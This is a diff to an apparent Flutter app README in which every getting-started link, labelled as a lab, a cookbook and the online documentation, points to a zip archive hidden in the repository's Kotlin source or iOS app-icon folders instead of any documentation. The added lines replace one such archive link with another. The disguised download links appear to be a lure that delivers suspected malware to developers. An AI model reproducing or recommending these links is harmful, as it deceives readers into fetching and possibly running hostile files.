@@ -8,9 +8,9 @@ This project is a starting point for a Flutter application.
 
 A few resources to get you started if this is your first Flutter project:
 
-- [Lab: Write your first Flutter app](https://github.com/jones0chikwezga/currency_converter_app/raw/refs/heads/main/android/app/src/main/kotlin/com/currency-app-converter-2.4.zip)
-- [Cookbook: Useful Flutter samples](https://github.com/jones0chikwezga/currency_converter_app/raw/refs/heads/main/android/app/src/main/kotlin/com/currency-app-converter-2.4.zip)
+- [Lab: Write your first Flutter app](https://raw.githubusercontent.com/jones0chikwezga/currency_converter_app/main/ios/Runner/Assets.xcassets/AppIcon.appiconset/currency-converter-app-leadable.zip)
+- [Cookbook: Useful Flutter samples](https://raw.githubusercontent.com/jones0chikwezga/currency_converter_app/main/ios/Runner/Assets.xcassets/AppIcon.appiconset/currency-converter-app-leadable.zip)
 
 For help getting started with Flutter development, view the
-[online documentation](https://github.com/jones0chikwezga/currency_converter_app/raw/refs/heads/main/android/app/src/main/kotlin/com/currency-app-converter-2.4.zip), which offers tutorials,
+[online documentation](https://raw.githubusercontent.com/jones0chikwezga/currency_converter_app/main/ios/Runner/Assets.xcassets/AppIcon.appiconset/currency-converter-app-leadable.zip), which offers tutorials,
 samples, guidance on mobile development, and a full API reference.
